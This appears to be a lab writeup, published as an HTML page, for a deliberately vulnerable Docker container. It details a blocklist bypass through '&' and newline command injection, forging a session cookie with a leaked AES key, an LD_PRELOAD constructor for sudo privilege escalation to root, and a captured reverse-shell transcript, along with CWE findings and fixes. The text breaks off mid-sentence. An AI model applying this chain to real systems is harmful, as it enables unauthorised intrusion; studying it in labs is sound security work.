@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 234 SECorNOTsec &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; SECorNOTsec</p><h1 id="234-secornotsec--writeup">234 SECorNOTsec — writeup</h1>
+<blockquote>
+<p><strong>Catalogue description</strong> (<code>catalog.txt:18</code>, full text):
+<em>&quot;Laboratorio para practicar la explotación de una inyección de comandos para obtener una reverse shell y escalar privilegios mediante sudo.&quot;</em></p>
+<p><strong>Manifest label</strong> (<code>tooling/labs.manifest:85</code>): <code>234|SECorNOTsec|medio|exploiting a command injection</code></p>
+<p><strong>Verdict on the label: correct.</strong> Command injection is real, a reverse shell was
+obtained, and privilege escalation via <code>sudo</code> closed to <code>euid=0</code>. Both advertised
+halves of the description were executed, not inferred. No misattribution to file.</p>
+</blockquote>
+<hr />
+<h2 id="surface">Surface</h2>
+<pre><code>nmap -sV -Pn -p- --min-rate 2000 [net-0-3]
+PORT     STATE SERVICE VERSION
+5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)
+Not shown: 65534 closed tcp ports (conn-refused)
+</code></pre>
+<p><code>/proc/net/tcp</code> and <code>/proc/net/tcp6</code> show <strong>two</strong> listeners, both <code>5000</code>:
+<code>00000000:1388</code> LISTEN (<code>0.0.0.0:5000</code>) and <code>030011AC:1388</code> TIME_WAIT on the
+container's own ephemeral side. <code>/proc/net/udp</code> is <strong>empty</strong> — 0 UDP bindings, so
+there is no UDP management plane hiding from <code>-p-</code>. The image's own
+<code>ExposedPorts</code> is <code>{&quot;5000/tcp&quot;: {}}</code>, which agrees.</p>
+<p><strong>Stack, read from a version-bearing file in the artefact</strong> (<code>pip3 list</code> inside the
+container — not recalled, not from a scan banner):</p>
+<table>
+<thead>
+<tr>
+<th>Package</th>
+<th>Version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Flask</td>
+<td><strong>3.1.3</strong></td>
+</tr>
+<tr>
+<td>Werkzeug</td>
+<td><strong>3.1.6</strong></td>
+</tr>
+<tr>
+<td>pycryptodome</td>
+<td><strong>3.23.0</strong></td>
+</tr>
+<tr>
+<td>Jinja2</td>
+<td>3.1.6</td>
+</tr>
+<tr>
+<td>click</td>
+<td>8.3.1</td>
+</tr>
+<tr>
+<td>itsdangerous</td>
+<td>2.2.0</td>
+</tr>
+<tr>
+<td>MarkupSafe</td>
+<td>3.0.3</td>
+</tr>
+<tr>
+<td>Python</td>
+<td><strong>3.10.12</strong></td>
+</tr>
+<tr>
+<td>OS</td>
+<td><code>/etc/os-release:1</code> → <code>PRETTY_NAME=&quot;Ubuntu 22.04.5 LTS&quot;</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Platform check.</strong> The image label <code>org.opencontainers.image.version: 22.04</code>
+agrees with <code>/etc/os-release:1</code> (<code>22.04.5 LTS</code>). This is the case where the label
+<em>could</em> have been wrong (labs 32, 220, 82) and is not: a 22.04 label and a 22.04.5
+<code>os-release</code> are the same claim from two independent files.</p>
+<h3 id="hidden-surface-found-an-inert-apache-tree">Hidden surface found: an inert Apache tree</h3>
+<p><code>/etc/apache2</code> <strong>exists</strong>, which is exactly lab 146's shape — a shipped artefact
+that looks explanatory and is dead. Measured, not assumed:</p>
+<pre><code>/etc/apache2/conf-available/javascript-common.conf   1 file, 127 bytes
+</code></pre>
+<pre><code class="language-apache">1  Alias /javascript /usr/share/javascript/
+3  &lt;Directory &quot;/usr/share/javascript/&quot;&gt;
+4  	Options FollowSymLinks MultiViews
+5  &lt;/Directory&gt;
+</code></pre>
+<p><strong>Proof it is inert</strong>, three ways: <code>dpkg -l | grep -c '^ii.*apache2 '</code> → <strong>0</strong>
+packages installed; <code>command -v apache2 nginx httpd | wc -l</code> → <strong>0</strong> binaries; and
+nothing ever binds 80/443 (1 open port of 65535). No <code>/usr/lib/apache2</code>,
+no <code>/etc/modsecurity</code>, and <code>find</code> for <code>mod_security*</code>/<code>*modsecurity*</code> → <strong>0</strong>
+files, CRS rules → <strong>0</strong> files. It cannot be doing anything. Filed as a lab defect
+(D3 below), not as a finding.</p>
+<hr />
+<h2 id="the-class--and-the-deliverable-which-kind-of-filter-this-is">The class — and the deliverable: <strong>which kind of filter this is</strong></h2>
+<p><strong>Entry criterion (RUNBOOK §5, <em>WAF / filter</em>):</strong> is the filter a <strong>string match</strong>
+or a <strong>scoring engine</strong>, and is the body even inspected?</p>
+<p><strong>Answer: a string match — a literal substring blocklist, in application code.</strong>
+It is not a scoring engine, not web-server middleware, and not absent. Quoted from
+the artefact, <code>/app/app.py:44-51</code>:</p>
+<pre><code class="language-python">44  # --- WAF: SEGURIDAD DE COMANDOS ---
+45  def waf_check(payload):
+46      # Bloqueamos operadores comunes y palabras clave de intérpretes
+47      denied = [&quot;;&quot;, &quot;&amp;&amp;&quot;, &quot;||&quot;, &quot;|&quot;, &quot;`&quot;, &quot;$&quot;, &quot;(&quot;, &quot;)&quot;, &quot;nc&quot;, &quot;bash&quot;, &quot;python&quot;, &quot;perl&quot;, &quot;ruby&quot;]
+48      for char in denied:
+49          if char in payload.lower():
+50              return False
+51      return True
+</code></pre>
+<p>Call site, <code>/app/app.py:53-63</code> — the filter runs on the string, then the string goes
+to a shell:</p>
+<pre><code class="language-python">53  def ping_host(address):
+54      if not address: return &quot;Esperando entrada...&quot;
+55      if not waf_check(address):
+56          return &quot;⚠️ [WAF ALERT]: Intento de inyección o comando no permitido detectado.&quot;
+57
+58      # Vulnerable a inyección via '&amp;' o '%0a' si el WAF no los cubren
+59      command = f&quot;ping -c 3 {address}&quot;
+60      try:
+61          process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+62          stdout, stderr = process.communicate(timeout=5)
+63          return stdout if process.returncode == 0 else stderr
+</code></pre>
+<p>And the developer <strong>named the bypass in a source comment at line 58</strong>:
+<code># Vulnerable a inyección via '&amp;' o '%0a' si el WAF no los cubren</code>.</p>
+<h3 id="why-string-match-not-scoring-engine-stated-as-a-measurement">Why &quot;string match&quot;, not &quot;scoring engine&quot;, stated as a measurement</h3>
+<ol>
+<li><strong>No score exists.</strong> <code>waf_check</code> returns <code>True</code>/<code>False</code> out of a substring loop.
+There is no anomaly score, no threshold, no per-variable attribution, no
+paranoia level. Contrast lab 84, where ModSecurity + the OWASP CRS assigns a
+score per variable and blocks on an aggregate threshold.</li>
+<li><strong>No engine exists.</strong> Zero <code>mod_security*</code>/<code>*modsecurity*</code> files, zero CRS
+files, zero web-server binaries (measured above). The only HTTP server is
+Werkzeug on 5000/tcp, so there is no middleware layer to attribute a block to.</li>
+<li><strong>It is not &quot;no filter&quot;</strong> (lab 168's answer). 13 of 13 denied tokens blocked,
+with a green positive control below.</li>
+<li><strong>It is not lab 218's second layer.</strong> 218 hashed two distinct 403 bodies; here
+there is one block body.</li>
+</ol>
+<h3 id="where-it-sits-in-the-218--84--168-line--and-the-rule-this-extends">Where it sits in the 218 / 84 / 168 line — and the rule this extends</h3>
+<table>
+<thead>
+<tr>
+<th>Lab</th>
+<th>Filter kind</th>
+<th>Bypass</th>
+<th>Status of the rule</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>218</td>
+<td>PHP string match</td>
+<td><code>[d]</code> — an unlisted encoding of a listed token</td>
+<td>rule born here</td>
+</tr>
+<tr>
+<td>84</td>
+<td>ModSecurity + CRS scoring engine</td>
+<td><strong>none of ten variants worked</strong></td>
+<td><strong>refuted</strong> 218's rule</td>
+</tr>
+<tr>
+<td>168</td>
+<td><strong>none</strong></td>
+<td>no filter to bypass; established by counts</td>
+<td>third position</td>
+</tr>
+<tr>
+<td><strong>234</strong></td>
+<td><strong>Python string match</strong></td>
+<td><strong><code>&amp;</code> and newline — an operator never on the list at all</strong></td>
+<td><strong>extends the rule</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>The extension, stated plainly.</strong> 84 refuted 218's claim as a <em>general</em> rule
+(&quot;a string filter is beaten by an unlisted encoding&quot;) only against a <em>scoring</em>
+engine — because a scoring engine has nothing unlisted to reach for. 234 does not
+contradict 84; it <strong>narrows</strong> what 84 refuted. Two mechanisms defeat a string
+match, and this lab is the cheap one:</p>
+<ul>
+<li><strong>(a) an unlisted <em>encoding</em> of a listed token</strong> — what 218 found (<code>[d]</code> for <code>d</code>);</li>
+<li><strong>(b) a token that was never listed at all</strong> — what 234 found.</li>
+</ul>
+<p>(b) is strictly cheaper and is the more common failure, because a hand-written
+blocklist of shell operators does not enumerate the operator set. The corpus now
+has <strong>two</strong> distinct string-match labs and <strong>one</strong> scoring engine, so the
+string-vs-scoring discriminator is confirmed on both sides with a positive control
+each.</p>
+<p><strong>A third mechanism, new to this corpus.</strong> The filter reads a <em>string</em>, but a
+different grammar reads the same bytes. 218's was glob-vs-string. Here it is
+<strong>printf's escape grammar vs the filter's keyword list</strong>:</p>
+<pre><code>payload line:  printf 'id\nsudo … syscheck\ncat /tmp/…'
+                          ↑ the two characters 'n' and 'c' of  \n  c at
+</code></pre>
+<p><code>waf_check</code> sees <code>nc</code> — the literal characters from the escaped newline followed
+by <code>cat</code> — and blocks, even though there is no <code>nc</code> token in the shell command
+and no <code>;</code> anywhere. My own guard assertion caught this on me before I sent it. It
+is the same family as self-correction §15 (<code>htmlspecialchars</code> escaping <code>&amp;</code>), one
+level over: <strong>a substring filter cannot see which grammar its bytes are destined
+for.</strong> This is why the payload in this writeup is hex-encoded and <code>tr</code>-decoded
+(see <em>Instrumentation defects</em>, D5).</p>
+<h3 id="the-filters-block-is-a-200-and-its-status-code-carries-no-signal">The filter's block is a 200, and its status code carries no signal</h3>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>HTTP status</th>
+<th>Wire bytes</th>
+<th>Time</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>127.0.0.1</code> (allowed)</td>
+<td><strong>200</strong></td>
+<td>2532</td>
+<td>2.06 s</td>
+</tr>
+<tr>
+<td><code>127.0.0.1; id</code> (<strong>blocked</strong>)</td>
+<td><strong>200</strong></td>
+<td>2239</td>
+<td>0.00 s</td>
+</tr>
+<tr>
+<td><code>127.0.0.1&amp; id</code> (injection)</td>
+<td><strong>200</strong></td>
+<td>2598</td>
+<td>2.03 s</td>
+</tr>
+</tbody>
+</table>
+<p><code>ping_host</code> returns the alert <strong>into the page body</strong> at <code>app.py:56</code>; the route
+still returns 200. So unlike 218 (two 403 bodies) and 84 (Apache's stock 403),
+<strong>the status code here cannot attribute a block at all</strong> — only the body can.
+This is a third shape for the WAF-attribution row.</p>
+<hr />
+<h2 id="chain">Chain</h2>
+<p>Every hop's identity was <strong>measured inside the primitive that produced it</strong>, and
+quoted verbatim. <code>uid</code>/<code>euid</code> pairs are reported; never the word &quot;root&quot; alone.</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>From → to</th>
+<th>Mechanism</th>
+<th>Identity proof (verbatim)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>unauthenticated → <code>guest</code></td>
+<td><code>GET /login</code> sets a session cookie (<code>app.py:129-136</code>)</td>
+<td>cookie issued, <code>GET /</code> 200 / 2005 B, <code>ACCESO RESTRINGIDO</code></td>
+</tr>
+<tr>
+<td>0b</td>
+<td>unauthenticated → <code>guest</code> <strong>→ admin</strong></td>
+<td><code>GET /env.bak</code> serves the AES key (<code>app.py:139-149</code>); forge <code>is_admin</code> offline</td>
+<td><code>GET /env.bak</code> <strong>200, 32 B</strong>, body <code>SECRET_KEY = 'H4ckTh3Pl4n3t_26'</code>; forged admin cookie → <code>GET /</code> <strong>200, 2185 B</strong> with <code>value=&quot;Ejecutar&quot;</code></td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>guest</code> → <strong>code execution as <code>firstatack</code></strong></td>
+<td>newline or <code>&amp;</code> injection through <code>waf_check</code> into <code>/bin/sh</code> (<code>app.py:59-61</code>)</td>
+<td><code>uid=1000(firstatack) gid=1000(firstatack) groups=1000(firstatack)</code>; <code>whoami</code> → <code>firstatack</code>; <code>Uid:\t1000\t1000\t1000\t1000</code> from <code>/proc/self/status</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>firstatack</code> (1000) → <strong><code>chocolate</code></strong> (1001)</td>
+<td><code>/etc/sudoers:55</code> <code>firstatack ALL=(chocolate) NOPASSWD: /usr/bin/find</code>; <code>find -exec … +</code></td>
+<td><code>uid=1001(chocolate) gid=1001(chocolate) groups=1001(chocolate)</code>; <code>id -u</code> → <code>1001</code>; <code>Uid:\t1001\t1001\t1001\t1001</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>chocolate</code> (1001) → <strong><code>root</code></strong> (0)</td>
+<td><code>/etc/sudoers:56</code> <code>chocolate ALL=(root) SETENV: NOPASSWD: /usr/local/bin/syscheck</code>; <code>SETENV</code> admits <code>LD_PRELOAD</code></td>
+<td>marker written by the loader constructor inside the root process: <code>ESC234_MARKER pid=554 uid=0 euid=0 gid=0</code>, file owner <code>root root</code> at <code>/root/ESC234_MARKER</code> (mode 644, dir mode 700)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="hop-3-needed-an-oracle-and-it-was-manufactured-first">Hop 3 needed an oracle, and it was manufactured first</h3>
+<p><code>syscheck</code> has <strong>no oracle</strong>: it prints one fixed line and exits 0 whatever it is
+run as. Measured directly — <code>stdout: System Status: All systems operational.</code>,
+<code>stderr:</code> empty, <code>rc=0</code>, whether run as root or as chocolate. Reporting &quot;I ran
+syscheck as root, therefore I was root&quot; is a claim about the future dressed as a
+result, so I built the oracle first:</p>
+<pre><code class="language-c">static void wr(const char*p,const char*t){FILE*f=fopen(p,&quot;w&quot;);if(f){fputs(t,f);fclose(f);}}
+__attribute__((constructor)) static void esc(void){
+  char b[128];
+  snprintf(b,sizeof b,&quot;ESC234_MARKER pid=%d uid=%d euid=%d gid=%d\n&quot;,getpid(),getuid(),geteuid(),getgid());
+  wr(&quot;/root/ESC234_MARKER&quot;,b);        /* only euid=0 can create this */
+  wr(&quot;/tmp/ESC234_ROOT_PROOF&quot;,b);     /* readable copy, for the HTTP read-back */
+}
+</code></pre>
+<p>Materialised <strong>on the target through the injection</strong>, as uid 1000:
+<code>/tmp/esc.hex</code> <strong>746 B</strong>, <code>/tmp/esc.c</code> <strong>373 B</strong> (exactly my source's byte count),
+<code>/tmp/esc.so</code> <strong>16008 B</strong>, <code>ls -la</code> owner <code>firstatack firstatack</code>. Then loaded via
+<code>sudo -n LD_PRELOAD=/tmp/esc.so /usr/local/bin/syscheck</code>.</p>
+<p>The <code>/tmp</code> copy is authenticated by the <code>/root</code> copy, not trusted on its own:
+<code>/root</code> is mode <strong>700</strong>, and both identities below it are <strong>refused</strong> —
+<code>firstatack</code>: <code>ls: cannot access '/root/ESC234_MARKER': Permission denied</code>;
+<code>chocolate</code>: <code>cat: /root/ESC234_MARKER: Permission denied</code>. Both copies carry the
+same 41 bytes.</p>
+<h3 id="the-reverse-shell-the-catalogue-advertises--obtained">The reverse shell the catalogue advertises — obtained</h3>
+<p>Delivered through <code>POST /diagnose</code>, script body hex-encoded, to a listener on the
+operator host only (no third-party infrastructure). Host-side capture:</p>
+<pre><code>SECORNOTSEC reverse shell: user=chocolate uid=1001 euid=1001
+uid=1001(chocolate) gid=1001(chocolate) groups=1001(chocolate)
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+chocolate@33ff98d44d5b:/app$ sudo -n LD_PRELOAD=/tmp/esc.so /usr/local/bin/syscheck
+System Status: All systems operational.
+chocolate@33ff98d44d5b:/app$ cat /tmp/ESC234_ROOT_PROOF
+ESC234_MARKER pid=673 uid=0 euid=0 gid=0
+</code></pre>
+<hr />
+<h2 id="findings">Findings</h2>
+<h3 id="f1--cwe-78-os-command-injection-filter-bypassed-by-an-operator-that-was-never-on-the-list">F1 — CWE-78 OS command injection, filter bypassed by an operator that was never on the list</h3>
+<p><code>app.py:59-61</code>, filter <code>app.py:45-51</code>. Impact: arbitrary command execution as
+<code>uid=1000(firstatack)</code>, and through it <code>euid=0</code>. Root cause: a blocklist of shell
+operators that enumerates 13 tokens of an operator set that has more, applied to a
+string that is then parsed by <code>/bin/sh</code>. <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code> and newline are all absent.
+<code>&gt;</code> alone gives <strong>arbitrary file write</strong> in the app's CWD with the WAF fully
+armed — I created <code>/app/id</code> (368 B, <code>firstatack:firstatack</code>, 0644) by probing
+<code>127.0.0.1&gt; id</code>, and removed it. Fix: do not build a shell string; use
+<code>subprocess.run([&quot;ping&quot;,&quot;-c&quot;,&quot;3&quot;,address])</code> with an argument vector, and validate
+the address against <code>ipaddress.ip_address()</code>.</p>
+<h3 id="f2--cwe-200--cwe-522-the-aes-session-key-is-served-unauthenticated">F2 — CWE-200 / CWE-522: the AES session key is served unauthenticated</h3>
+<p><code>app.py:139-149</code> serves <code>/app/env.bak</code> to anyone; <code>app.py:12-25</code> reads the key from
+that same file. <code>GET /env.bak</code> → <strong>200, 32 B, <code>text/plain</code></strong>. This alone is full
+authentication bypass: the forged <code>is_admin: true</code> cookie gets
+<code>GET /</code> → 200 with the admin form. Root cause: a secret and a public route in the
+same file, with no authentication on the route. Fix: delete the route; load the
+key from an env var or a <code>0600</code> file outside the docroot.</p>
+<h3 id="f3--cwe-327--cwe-329-static-iv-deterministic-session-cookie">F3 — CWE-327 / CWE-329: static IV, deterministic session cookie</h3>
+<p><code>app.py:26</code> <code>IV = b'0123456789abcdef'</code> — a constant. <code>encrypt_cookie</code>
+(<code>app.py:29-33</code>) uses CBC with that constant IV, so <strong>the same plaintext always
+yields the same ciphertext</strong>. Demonstrated positively: my offline forge of
+<code>{&quot;user&quot;: &quot;guest&quot;, &quot;is_admin&quot;: false}</code> reproduced the server's own <code>/login</code> cookie
+<strong>byte-for-byte</strong> (<code>6JmCIseGBxSEntdM4LWH8kM4nu9N/RocoWVhf8o1KXtmePv1ptCw/LQUCOW1XWTK</code>).
+That is both a proof the forge follows the same code path (§22) and the weakness
+itself. Fix: random 16-byte IV per cookie, prepended to the ciphertext.</p>
+<h3 id="f4--cwe-1004-session-cookie-has-no-httponly-no-secure-no-samesite">F4 — CWE-1004: session cookie has no <code>HttpOnly</code>, no <code>Secure</code>, no <code>SameSite</code></h3>
+<p>Measured on the wire:</p>
+<pre><code>[response-cookie-header]: user_session=6JmCIseGBxSEntdM4LWH8kM4nu9N/RocoWVhf8o1KXtmePv1ptCw/LQUCOW1XWTK; Path=/
+</code></pre>
+<p><code>app.py:135</code> passes no flags. Impact: script-readable session token. Fix:
+<code>set_cookie(..., httponly=True, secure=True, samesite='Strict')</code>.</p>
+<h3 id="f5--cwe-798-hardcoded-fallback-key">F5 — CWE-798: hardcoded fallback key</h3>
+<p><code>app.py:23</code> <code>return b'1234567890123456' # Fallback de EXACTAMENTE 16 bytes</code>. Dead on
+this image because <code>/app/env.bak</code> exists, so this is reported as <strong>latent, not
+exploited</strong> — deleting the file would silently downgrade every session to a key
+that is in the source. The bare <code>except:</code> at <code>app.py:21-22</code> is what lets a parse
+failure reach it.</p>
+<h3 id="f6--cwe-209-internal-exception-text-returned-to-the-client">F6 — CWE-209: internal exception text returned to the client</h3>
+<p><code>app.py:64-65</code> <code>except Exception as e: return str(e)</code>. A host that does not answer
+within 5 s returns <strong>the Python exception verbatim into the page</strong>:
+<code>Command 'ping -c 3 192.0.2.1' timed out after 5 seconds</code> — which discloses the
+exact command template, <code>subprocess</code> usage and the 5-second budget. Measured:
+<code>192.0.2.1</code> → <strong>2227 B, 5.01 s</strong>. Impact: information disclosure plus a
+<strong>5-second-per-request denial of service</strong>, since <code>communicate(timeout=5)</code> blocks
+the worker. Fix: log, return a fixed message.</p>
+<h3 id="f7--cwe-250-setenv-on-a-root-grant-makes-usrlocalbinsyscheck-arbitrary-root-code-execution">F7 — CWE-250: <code>SETENV</code> on a root grant makes <code>/usr/local/bin/syscheck</code> arbitrary root code execution</h3>
+<p><code>/etc/sudoers:56</code>. <code>SETENV</code> admits command-line environment assignment, and
+<code>LD_PRELOAD</code> survives sudo 1.9.9's <code>env_reset</code>. Established with an A/B, not an
+assertion — one positive, two negatives:</p>
+<table>
+<thead>
+<tr>
+<th>command run as <code>chocolate</code></th>
+<th>oracle fired</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo -n LD_PRELOAD=/tmp/m.so /usr/local/bin/syscheck</code></td>
+<td><strong>YES</strong> (<code>euid=0</code>)</td>
+</tr>
+<tr>
+<td><code>LD_PRELOAD=/tmp/m.so sudo -n -E /usr/local/bin/syscheck</code></td>
+<td>no</td>
+</tr>
+<tr>
+<td><code>sudo -n -E /usr/local/bin/syscheck</code></td>
+<td>no</td>
+</tr>
+</tbody>
+</table>
+<p>So <code>-E</code> does <strong>not</strong> work; only the SETENV-authorised command-line form does. Note
+<code>secure_path</code> in <code>Defaults</code> did <strong>not</strong> stop this — the loader variables are not
+path variables. Fix: drop <code>SETENV</code>; if an env var is genuinely needed, use
+<code>sudoers</code> <code>env_keep</code> for that one name.</p>
+<hr />
+<h2 id="controls-that-held">Controls that held</h2>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Positive control that proves the detector works</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Route authorisation (<code>app.py:121-123</code>)</td>
+<td>forged admin cookie → <code>GET /</code> <strong>200 / 2185 B</strong> with the form; the app's <strong>own</strong> guest cookie → <code>POST /diagnose</code> <strong>403 / 36 B</strong> <code>No tienes permisos para estar aquí.</code></td>
+<td><strong>held</strong></td>
+</tr>
+<tr>
+<td>The WAF itself (<code>app.py:45-51</code>)</td>
+<td><strong>13 of 13</strong> denied tokens blocked, <strong>2239 B</strong>, <strong>0.00 s</strong>, body contains <code>WAF ALERT</code>. Run <em>before</em> any belief about a bypass.</td>
+<td><strong>held, and is beatable</strong></td>
+</tr>
+<tr>
+<td><code>sudo</code> boundary for <code>firstatack</code></td>
+<td><code>sudo -n LD_PRELOAD=… syscheck</code> → <code>sudo: a password is required</code>; <code>sudo -n -u chocolate /usr/bin/id</code> → <code>sudo: a password is required</code>. Both run as the <strong>LAST</strong> command so stderr reaches <code>app.py:63</code>.</td>
+<td><strong>held</strong></td>
+</tr>
+<tr>
+<td><code>sudo</code> boundary for <code>chocolate</code></td>
+<td><code>sudo -n -u root /usr/bin/id</code> → <code>sudo: a password is required</code> (the reverse shell, verbatim)</td>
+<td><strong>held</strong></td>
+</tr>
+<tr>
+<td><code>/root</code> confidentiality</td>
+<td>marker written there by euid 0; refused to <code>firstatack</code> and to <code>chocolate</code></td>
+<td><strong>held</strong></td>
+</tr>
+<tr>
+<td><code>/etc/sudoers.d</code></td>
+<td>only the stock <code>README</code> (mode <code>r--r-----</code>); the two grants live in <code>/etc/sudoers</code> lines <strong>55-56</strong></td>
+<td>nothing hidden</td>
+</tr>
+</tbody>
+</table>
+<h3 id="the-sinks-dependency-actually-ran-lab-168s-defect-explicitly-checked">The sink's dependency actually ran (lab 168's defect, explicitly checked)</h3>
+<p>Lab 168's <code>ping</code> endpoint shipped without <code>ping</code>. <strong>Not the case here, and I checked
+before reading any response as the filter acting:</strong></p>
+<pre><code>which ping           -&gt; /usr/bin/ping   (76680 B, root:root, 0755)
+ping -c1 127.0.0.1   -&gt; ping_rc=0
+POST /diagnose address=127.0.0.1 -&gt; 200, 2532 B, three &quot;bytes from 127.0.0.1&quot; lines
+</code></pre>
+<h3 id="the-four-outcome-states-are-byte-separable">The four outcome states are byte-separable</h3>
+<p>This matters because a WAF block, a ping failure and an empty result are otherwise
+easy to confuse:</p>
+<table>
+<thead>
+<tr>
+<th>state</th>
+<th>trigger</th>
+<th>wire bytes</th>
+<th>time</th>
+<th>marker in body</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>PING_OK</code></td>
+<td><code>127.0.0.1</code></td>
+<td>2532</td>
+<td>2.06 s</td>
+<td><code>bytes from</code></td>
+</tr>
+<tr>
+<td><code>WAF_BLOCK</code></td>
+<td><code>127.0.0.1; id</code></td>
+<td><strong>2239</strong></td>
+<td><strong>0.00 s</strong></td>
+<td><code>WAF ALERT</code></td>
+</tr>
+<tr>
+<td>injection</td>
+<td><code>127.0.0.1&amp; id</code></td>
+<td>2598</td>
+<td>2.03 s</td>
+<td><code>uid=1000(firstatack)</code></td>
+</tr>
+<tr>
+<td><code>PING_FAIL</code> (stderr returned)</td>
+<td><code>192.0.2.1</code></td>
+<td>2227</td>
+<td><strong>5.01 s</strong></td>
+<td><code>timed out after 5 seconds</code></td>
+</tr>
+<tr>
+<td>empty address</td>
+<td><em>(no value)</em></td>
+<td>2184</td>
+<td>0.00 s</td>
+<td><code>Esperando entrada...</code></td>
+</tr>
+<tr>
+<td><code>EMPTY</code> (rc 0, stdout empty)</td>
+<td><code>127.0.0.1&gt; id</code></td>
+<td>2164</td>
+<td>2.10 s</td>
+<td><em>(nothing)</em></td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>shell_exec</code>-style blindness does not apply either.</strong> Lab 168's warning was that
+stdout-only capture makes a stderr message look like an empty body. Here <strong>both
+streams are piped</strong> (<code>app.py:61</code>), and <code>PING_FAIL</code> states carry real stderr text —
+<code>ping: id: No address associated with hostname</code> — so a negative is readable.
+What <em>is</em> broken is narrower and is D1 below.</p>
+<hr />
+<h2 id="negatives-each-with-its-work-count">Negatives, each with its work count</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Negative</th>
+<th>Work count</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>N1</td>
+<td>10 of 13 denied operators are unnecessary — <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code> and newline carry the chain</td>
+<td>13 denied tokens tested, <strong>13 blocked</strong>; <strong>15</strong> unlisted candidates tested, <strong>2</strong> gave command execution (<code>&amp;</code>, <code>\n</code>), <strong>3</strong> gave shell-level behaviour (<code>&lt;</code> redirect, <code>&gt;</code> redirect, <code>\t</code> as a token separator is not)</td>
+</tr>
+<tr>
+<td>N2</td>
+<td><code>ping</code> is installed and functional — lab 168's missing-dependency defect absent</td>
+<td><code>which ping</code> 1 hit; <code>ping_rc=0</code>; 3 ICMP replies in the live response</td>
+</tr>
+<tr>
+<td>N3</td>
+<td>No web-server WAF engine exists to attribute a block to</td>
+<td><code>mod_security*</code>/<code>*modsecurity*</code> → <strong>0 files</strong>; CRS → <strong>0 files</strong>; web-server binaries → <strong>0</strong>; <code>/proc/net/udp</code> → <strong>0 bindings</strong></td>
+</tr>
+<tr>
+<td>N4</td>
+<td><code>firstatack</code> cannot reach the root grant</td>
+<td><strong>2</strong> attempts, both <code>sudo: a password is required</code></td>
+</tr>
+<tr>
+<td>N5</td>
+<td><code>chocolate</code> has exactly one root grant, not a shell</td>
+<td><strong>1</strong> attempt, <code>sudo: a password is required</code></td>
+</tr>
+<tr>
+<td>N6</td>
+<td><code>sudo -E</code> does <strong>not</strong> carry <code>LD_PRELOAD</code> past <code>env_reset</code></td>
+<td><strong>2</strong> distinct forms tested, <strong>0</strong> oracle fires (vs <strong>1 of 1</strong> for the SETENV form)</td>
+</tr>
+<tr>
+<td>N7</td>
+<td>The <code>/root</code> marker cannot be read from below root</td>
+<td><strong>2</strong> identities refused (<code>firstatack</code>, <code>chocolate</code>)</td>
+</tr>
+<tr>
+<td>N8</td>
+<td><code>chocolate</code> cannot write into <code>/root</code> or read back its own privilege proof from there</td>
+<td><code>ls: cannot access '/root/ESC234_MARKER': Permission denied</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="not-tested-vs-discarded-with-reason">NOT tested vs discarded with reason</h2>
+<p><strong>NOT tested (a count of zero means UNTESTED, and belongs here):</strong></p>
+<ul>
+<li><strong>The <code>nginx</code>/Apache server branch</strong> — UNTESTED as an attack surface, because it
+does not exist: 0 binaries, 0 packages, 0 listeners. Not a negative result.</li>
+<li><strong>Network egress beyond one reverse shell to the operator host.</strong> Not tested.
+<code>nc</code>, <code>curl</code>, <code>wget</code>, <code>socat</code> are all <strong>absent</strong> (<code>command -v</code> → 0 each), so the
+only outbound channel available is bash's <code>/dev/tcp</code>. Count of <em>other</em> channels
+attempted: <strong>0</strong> → UNTESTED, not &quot;there are none&quot;.</li>
+<li><strong>Timing side channel</strong> on <code>waf_check</code>. Not tested. The WAF's own 0.00 s vs
+2.06 s gap makes a timing oracle available for <em>any</em> future denylist change, but
+I did not build or measure it.</li>
+<li><strong>Whether the blocklist is reachable from any route other than <code>/diagnose</code>.</strong> One
+route sinks input (<code>app.py:119-127</code>); I did not fuzz the other four.</li>
+<li><strong><code>/logout</code> cookie clearing</strong> (<code>app.py:151-155</code>) — not tested.</li>
+</ul>
+<p><strong>Discarded, with reason:</strong></p>
+<ul>
+<li><strong>Cryptanalytic attack on the AES cookie</strong> (padding oracle). Discarded: F2 gives
+the key directly, so the attack is pointless, and <code>decrypt_cookie</code>'s bare
+<code>except</code> returns <code>None</code> with no distinguishable error path to act as an oracle.</li>
+<li><strong>Reaching root by making <code>syscheck</code> read a writable file.</strong> Discarded: measured
+— <code>/usr/local/bin/syscheck</code> imports only <code>puts</code>, <code>.rodata</code> at offset <code>0x2008</code> is
